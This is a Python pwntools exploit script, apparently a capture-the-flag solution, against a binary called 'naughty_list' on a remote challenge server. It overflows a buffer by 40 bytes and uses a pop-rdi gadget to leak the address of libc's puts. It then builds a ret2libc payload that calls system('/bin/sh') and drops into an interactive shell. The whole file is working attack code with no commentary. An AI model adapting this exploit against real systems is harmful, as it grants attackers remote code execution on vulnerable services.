from pwn import *
import sys, re

regex = r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])'
ansi_escape = re.compile(regex.encode())
elf = ELF('./naughty_list')

if args.LOCAL:
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	p = elf.process()
else:
	libc = ELF('./libc.so.6')
	host = '178.128.35.132'
	port = 30511
	p = remote(host, port)

def recvline():
	line = p.recvuntil(b'\x1b[0m')
	line = ansi_escape.sub(b'', line)
	return line

def sendlineafter(s, payload):
	data = b''
	while True:
		data += recvline()
		if data.endswith(s):
			break
	p.sendline(payload)
	return data

sendlineafter(b'only): ', b'Neel')
sendlineafter(b'only): ', b'Gupta')
sendlineafter(b'120): ', b'18')

pop_rdi = 0x401443
ret = 0x400756
offset = 40
func = 'puts'

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got[func])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['get_descr'])

sendlineafter(b'it: ', payload)
leak = recvline().split(b'\n')[2]
leak = leak.ljust(8, b'\x00')
leak = u64(leak)

log.info(f'Leaked {func}: {hex(leak)}')
libc.address = leak - libc.symbols[func]
binsh = next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])
p.sendline(payload)

p.interactive()

p.close()